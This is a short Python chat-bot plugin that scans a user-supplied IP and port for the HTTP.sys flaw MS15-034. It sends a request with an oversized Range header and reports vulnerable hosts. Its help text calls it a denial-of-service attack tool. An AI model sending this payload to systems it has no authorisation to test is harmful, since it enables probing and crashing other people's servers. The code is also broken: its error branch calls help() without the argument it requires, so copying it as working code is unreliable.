# coding:utf-8
import socket
import threading

def check(ip, port, timeout,msg):
    try:
        socket.setdefaulttimeout(timeout)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, int(port)))
        flag = "GET / HTTP/1.0\r\nHost: stuff\r\nRange: bytes=0-18446744073709551615\r\n\r\n"
        s.send(flag)
        data = s.recv(1024)
        s.close()
        if 'Requested Range Not Satisfiable' in data:
            msg.Reply(ip + " 存在HTTP.sys远程代码执行漏洞")
    except:
        msg.Reply(help())

def work(msg,info):
    msg.content = msg.content.strip()
    if msg.content.startswith("ms15-034"):
        if not info.get('level', 3) < 4:
            return False
        try:
            host = msg.content.split(' ',1)[-1]
            port = '80'
            if host.count(' '):
                port = host.split(' ')[-1]
                host = host.split(' ')[0]
            threading.Thread(target=check, args=(host, int(port), 5, msg)).start()
            return '已经添加扫描任务'
        except:
            return help(info)
    else:
        return False


def help(info):
    if not info.get('level',3) < 4:
        return False
    return '#ms15-034 ip [port] HTTP.sys 远程代码执行，目前仅能作DOS攻击'
